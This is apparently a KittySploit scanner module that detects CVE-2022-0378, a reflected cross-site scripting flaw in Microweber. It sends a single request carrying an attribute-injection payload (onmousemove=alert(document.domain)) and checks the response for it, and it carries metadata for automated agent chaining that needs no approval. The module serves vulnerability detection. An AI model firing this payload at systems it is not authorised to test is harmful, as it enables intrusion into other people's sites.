#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Microweber contains a reflected cross-site scripting in Packagist microweber/microweber prior to 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Microweber Cross-Site Scripting Detection',
        'description': 'Microweber contains a reflected cross-site scripting in Packagist microweber/microweber prior to 1.2.11.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'microweber', 'xss', 'huntr', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0378',
            'https://github.com/microweber/microweber/commit/fc7e1a026735b93f0e0047700d08c44954fce9ce',
            'https://huntr.dev/bounties/529b65c0-5be7-49d4-9419-f905b8153d31',
            'https://github.com/vohvelikissa/bugbouncing',
            'https://github.com/x86trace/Oneliners',
        ],
        'cve': 'CVE-2022-0378',
    }

    def run(self):
        r = self.http_request(method="GET", path='/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(document.domain)+xx=%22test&from_url=x', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('mwui_init', 'onmousemove="alert(document.domain)',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Microweber Cross-Site Scripting detected",
                path='/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(document.domain)+xx=%22test&from_url=x',
            )
            return True
        return False

